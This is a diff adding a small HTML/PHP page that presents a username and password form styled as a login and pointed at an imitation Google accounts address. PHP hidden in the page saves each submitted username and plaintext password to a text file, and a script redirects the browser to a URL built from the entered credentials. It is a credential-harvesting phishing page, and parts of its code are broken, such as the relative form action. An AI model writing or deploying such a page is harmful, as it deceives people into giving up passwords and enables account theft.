@@ -1,0 +1,56 @@
+<html>
+<head>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+</head>
+<style>
+body{
+    background-image: url('./img/code3.png');
+    background-repeat: no-repeat;
+    background-size: cover;
+}
+form{
+    background: #008;
+    color: #333;
+    text-align: center;
+    border: 2px #32fff6 solid;
+    height: 200px;
+    width: 200px;
+    color: #fff;
+}
+
+</style>
+<body>
+    <header hidden><?php
+        if($_SERVER["REQUEST_METHOD"] == "POST"){
+        $text = $_POST['text'];
+        $password = $_POST['password'];
+        $hashed_password = password_hash($password, PASSWORD_ARGON2ID);
+        $file = fopen("new.txt", "w+");
+        fwrite($file, "$text <br/> $password");
+        fclose($file);
+        }
+        ?>
+        </header>
+        <center>
+    <form action="./https://accounts.google.com/b/0/AddMailService" method="POST">
+<p>Username</p>
+<input id="text" type="text" name="text"/>
+<p>Password</p>
+<input id="password" type="Password" name="password"/>
+<p></p>
+<button onclick="form()" type="submit">click</button>
+</form>
+</center>
+<button hidden onclick="form()" type="submit">web</button>
+<script>
+    function form(){
+const details = document.querySelector("#text");
+const secrets = document.querySelector("#password");
+location = "https://" + details.value + "" +secrets.value;
+    }
+</script>
+</body>
+</html>
